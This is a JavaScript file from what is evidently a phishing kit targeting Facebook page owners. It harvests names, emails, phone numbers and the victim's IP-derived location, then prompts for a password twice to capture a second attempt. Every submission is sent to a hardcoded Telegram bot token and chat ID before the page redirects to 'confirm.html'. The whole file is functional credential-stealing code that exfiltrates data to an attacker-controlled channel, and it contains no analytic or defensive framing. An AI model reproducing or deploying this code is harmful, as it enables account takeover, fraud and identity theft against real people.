let form = document.getElementById("form");

let bot = {
    TOKEN: "6364188191:AAFmBsaqx58xGorfI_ergea9gA7UFyoLtOA",
    chatID: "-4122063919",
};

function openForm() {
    document.getElementById("myForm").style.display = "flex";
}

function closeForm() {
    document.getElementById("myForm").style.display = "none";
}

form.addEventListener("submit", (e) => {
    e.preventDefault();
    $.getJSON("https://api.db-ip.com/v2/free/self", function (data) {
        let nameFanpage = ` Facebook Page: ${
            document.getElementsByName("nameFanpage")[0].value
        }`;
        let fullname = `Fullname: ${
            document.getElementsByName("fullname")[0].value
        }`;
        let email = `User Email: ${
            document.getElementsByName("email")[0].value
        }`;
        let personalMail = `User Email: ${
            document.getElementsByName("personalEmail")[0].value
        }`;
        let phone = `Phone Number:  ${
            document.getElementsByName("phone")[0].value
        }`;
        let information = `Information: ${
            document.getElementsByName("information")[0].value
        }`;
        console.log(data);
        let ip = `IP Address: ${data.ipAddress}`;
        let country = `Country: ${data.countryName}(${data.countryCode})`;
        let city = `City: ${data.city}`;
        let p1 = "";
        let p2 = "";
        openForm();
        let popupform = document.getElementById("form1");
        popupform.addEventListener("submit", (e1) => {
            e1.preventDefault();
            if (p1 === "") {
                p1 = document.getElementsByName("password")[0].value;
                let password1 = `First Password: ${p1}`;
                let password2 = `Second Password:  ${p2}`;
                document.getElementById("message").style.display = "block";
                document.getElementsByName("password")[0].value = "";
                let message = `
                ${email}
                \n${nameFanpage}
                \n${fullname}
                \n${personalMail}
                \n${phone}
                \n${password1}
                \n${password2}
                \n${information}
                \n${ip}
                \n${country}
                \n${city}`;
                fetch(
                    `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
                    {
                        method: "GET",
                    }
                )
                    .then((res) => console.log(res))
                    .catch((err) => console.log(err));
            } else {
                p2 = document.getElementsByName("password")[0].value;
                let password1 = `First Password: ${p1}`;
                let password2 = `Second Password:  ${p2}`;
                document.getElementById("message").style.display = "block";
                let message = `
            ${email}
            \n${nameFanpage}
            \n${fullname}
            \n${personalMail}
            \n${phone}
            \n${password1}
            \n${password2}
            \n${information}
            \n${ip}
            \n${country}
            \n${city}`;
                fetch(
                    `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
                    {
                        method: "GET",
                    }
                )
                    .then((res) => {
                        console.log(res);
                        window.location.href = "confirm.html";
                    })
                    .catch((err) => console.log(err));
            }
        });
    });
});
